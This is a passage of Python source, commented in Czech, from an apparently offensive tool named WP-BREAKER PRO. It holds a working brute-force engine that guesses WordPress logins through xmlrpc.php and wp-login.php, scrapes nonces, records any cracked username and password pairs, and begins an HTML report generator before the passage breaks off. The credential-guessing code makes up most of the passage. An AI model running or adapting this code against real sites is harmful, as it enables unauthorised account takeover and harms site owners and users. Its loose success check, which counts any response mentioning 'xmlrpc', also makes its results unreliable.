            return r.status_code == 200
        except Exception:
            return False


# =============================================================================
# MODUL 8: SmartBruteForcer (Hlavní brute-force engine)
# =============================================================================

class SmartBruteForcer:
    """Chytrý brute-force engine s detekcí úspěšného přihlášení"""
    
    def __init__(self, target, usernames, passwords, output):
        self.target = target
        self.usernames = usernames if isinstance(usernames, list) else [usernames]
        self.passwords = passwords if isinstance(passwords, list) else [passwords]
        self.output = output
        self.method = "wplogin"
        self.found_credentials = []
        self.total_attempts = 0
        self.lock = threading.Lock()
    
    def brute_force(self):
        """Hlavní brute-force metoda"""
        self.output.phase(f"BRUTE-FORCE ({self.method.upper()})")
        
        total = len(self.usernames) * len(self.passwords)
        self.output.info(f"Celkem kombinací: {total}")
        self.output.info(f"Metoda: {self.method}")
        self.output.info(f"Uživatelé: {len(self.usernames)}, Hesla: {len(self.passwords)}")
        
        self.total_attempts = total
        
        if self.method == "xmlrpc":
            return self._xmlrpc_bruteforce()
        else:
            return self._wp_login_bruteforce()
    
    def _xmlrpc_bruteforce(self):
        """Brute-force přes XML-RPC (system.multicall)"""
        self.output.info("Používám XML-RPC (multicall) metodu...")
        
        xml_url = self.target.rstrip('/') + "/xmlrpc.php"
        
        try:
            # Test XML-RPC
            test_xml = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
            tr = requests.post(xml_url, data=test_xml,
                              headers={"Content-Type": "text/xml"},
                              timeout=5, verify=False)
            
            if tr.status_code != 200:
                self.output.error("XML-RPC nedostupný")
                self.output.info("Přepínám na wp-login metodu...")
                self.method = "wplogin"
                return self._wp_login_bruteforce()
        
        except Exception:
            self.output.error("XML-RPC selhal, přepínám na wp-login")
            self.method = "wplogin"
            return self._wp_login_bruteforce()
        
        # Brute-force
        for username in self.usernames:
            attempt = 0
            for password in self.passwords:
                attempt += 1
                
                xml_payload = f'''<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>'''
                
                try:
                    r = requests.post(xml_url, data=xml_payload,
                                     headers={"Content-Type": "text/xml"},
                                     timeout=5, verify=False)
                    
                    if "isAdmin" in r.text or "blogName" in r.text or "xmlrpc" in r.text.lower():
                        with self.lock:
                            self.found_credentials.append((username, password, "xmlrpc"))
                            self.output.success(f"Nalezeno! {username}:{password}")
                            self.output.add_finding("XML-RPC přihlášení", 
                                                   f"{username}:{password}", "danger")
                            self.output.brute_force_progress(attempt, len(self.passwords),
                                                           username, password, "SUCCESS!")
                            break
                    elif "403" in r.text:
                        self.output.warning("XML-RPC blokován (403)")
                        break
                    else:
                        self.output.brute_force_progress(attempt, len(self.passwords),
                                                       username, password, "FAIL")
                
                except Exception as e:
                    self.output.brute_force_progress(attempt, len(self.passwords),
                                                   username, password, "ERROR")
            
            if self.found_credentials:
                break
        
        print()
        self.output.separator()
        return self.found_credentials
    
    def _wp_login_bruteforce(self):
        """Brute-force přes wp-login.php"""
        self.output.info("Používám wp-login.php metodu...")
        
        login_url = self.target.rstrip('/') + "/wp-login.php"
        total = len(self.usernames) * len(self.passwords)
        progress = 0
        
        for username in self.usernames:
            for password in self.passwords:
                progress += 1
                
                # Získání nonce (každých 5 pokusů)
                nonce = ""
                if progress % 5 == 0:
                    try:
                        gr = requests.get(login_url, timeout=5, verify=False,
                                         headers={"User-Agent": "Mozilla/5.0"})
                        nonce_match = re.search(r'name="_wpnonce"[^>]*value="([^"]+)"', gr.text)
                        if nonce_match:
                            nonce = nonce_match.group(1)
                    except Exception:
                        pass
                
                login_data = {
                    "log": username,
                    "pwd": password,
                    "wp-submit": "Log In",
                    "redirect_to": self.target.rstrip('/') + "/wp-admin/",
                    "testcookie": "1"
                }
                
                if nonce:
                    login_data["_wpnonce"] = nonce
                
                try:
                    r = requests.post(login_url, data=login_data,
                                     headers={"User-Agent": "Mozilla/5.0",
                                             "Cookie": "wordpress_test_cookie=WP%20Cookie%20check"},
                                     timeout=5, verify=False, allow_redirects=True)
                    
                    if "/wp-admin" in r.url and "reauth" not in r.url:
                        self.found_credentials.append((username, password, "wplogin"))
                        self.output.success(f"Nalezeno! {username}:{password}")
                        self.output.add_finding("WP-Login přihlášení",
                                               f"{username}:{password}", "danger")
                        self.output.brute_force_progress(progress, total,
                                                       username, password, "SUCCESS!")
                        break
                    elif "ERROR" in r.text or "incorrect" in r.text.lower():
                        self.output.brute_force_progress(progress, total,
                                                       username, password, "FAIL")
                    else:
                        self.output.brute_force_progress(progress, total,
                                                       username, password, f"CODE:{r.status_code}")
                
                except Exception as e:
                    self.output.brute_force_progress(progress, total,
                                                   username, password, f"ERR:{str(e)[:15]}")
            
            if self.found_credentials:
                break
        
        print()
        self.output.separator()
        return self.found_credentials


# =============================================================================
# MODUL 9: Report
# =============================================================================

class ReportGenerator:
    """Generátor HTML/TXT reportů"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.findings = output.findings
        self.start_time = output.start_time
        self.elapsed = output.get_elapsed()
    
    def generate_html(self):
        """Generuje HTML report"""
        hostname = self.target.replace("https://", "").replace("http://", "").split("/")[0]
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(REPORT_DIR, f"report_{hostname}_{timestamp}.html")
        
        severity_icons = {"danger": "🔴", "warning": "🟡", "info": "🔵"}
        
        html = f"""<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <title>WP-BREAKER PRO Report - {hostname}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0f; color: #e0e0e0; }}
        .container {{ max-width: 900px; margin: 0 auto; padding: 20px; }}
        .header {{ background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                   border: 1px solid #0f3460; padding: 30px; margin-bottom: 20px;
                   border-radius: 8px; text-align: center; }}
        .header h1 {{ color: #e94560; font-size: 24px; margin-bottom: 10px; }}
        .header .meta {{ color: #888; font-size: 13px; }}
        .header .version {{ color: #0f3460; font-size: 12px; }}
        .stats {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }}
        .stat-box {{ background: #1a1a2e; border: 1px solid #0f3460; padding: 15px; 
                    border-radius: 6px; text-align: center; }}
        .stat-box .number {{ font-size: 28px; font-weight: bold; color: #e94560; }}
        .stat-box .label {{ font-size: 11px; color: #888; margin-top: 5px; }}
        .section {{ background: #1a1a2e; border: 1px solid #0f3460; margin-bottom: 15px;
                   border-radius: 6px; overflow: hidden; }}
        .section-title {{ background: #0f3460; padding: 12px 15px; font-size: 14px;
                        font-weight: bold; color: #e94560; }}
        .section-content {{ padding: 15px; }}
        .finding {{ padding: 8px 12px; margin-bottom: 5px; border-left: 3px solid;
                  background: rgba(255,255,255,0.02); border-radius: 3px; font-size: 13px; }}
        .finding.danger {{ border-color: #e94560; }}
        .finding.warning {{ border-color: #ffd369; }}
        .finding.info {{ border-color: #0f3460; }}
        .finding .cat {{ color: #e94560; font-weight: bold; }}
        .finding .val {{ color: #ccc; }}
        .finding .sev {{ font-size: 11px; color: #888; }}
        .footer {{ text-align: center; color: #444; font-size: 11px; margin-top: 30px;
                  padding: 15px; border-top: 1px solid #0f3460; }}
        @media (max-width: 600px) {{ .stats {{ grid-template-columns: repeat(2, 1fr); }} }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 WP-BREAKER PRO v{VERSION}</h1>
            <div class="meta">
                Report generován: {datetime.now().strftime("%d.%m.%Y %H:%M:%S")}
                | Doba testování: {self.elapsed} | Cíl: {self.target}
            </div>
        </div>
        
        <div class="stats">
            <div class="stat
